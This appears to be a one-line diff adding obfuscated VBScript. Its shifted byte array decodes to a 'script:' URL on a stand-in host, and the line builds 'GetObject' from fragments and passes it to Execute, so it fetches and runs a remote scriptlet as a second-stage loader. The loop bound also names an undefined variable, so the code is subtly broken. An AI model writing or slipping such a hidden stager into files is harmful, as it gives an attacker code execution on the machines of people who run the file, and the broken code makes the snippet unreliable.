@@ -1,0 +1,1 @@
+Dim a,b,t,i : a=Array(&H70,&H60,&H6f,&H66,&H6d,&H71,&H37,&H65,&H71,&H71,&H6d,&H70,&H37,&H2c,&H2c,&H62,&H75,&H5e,&H6a,&H6d,&H69,&H62,&H2b,&H66,&H6b,&H73,&H5e,&H69,&H66,&H61,&H2c,&H70,&H71,&H5e,&H64,&H62):b=Array(3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3):t="":For i=0 To UBound(other):t=t&Chr(a(i)+b(i)):Next:k="Ge"&"tObj"&"ect":Execute k&"(t)"
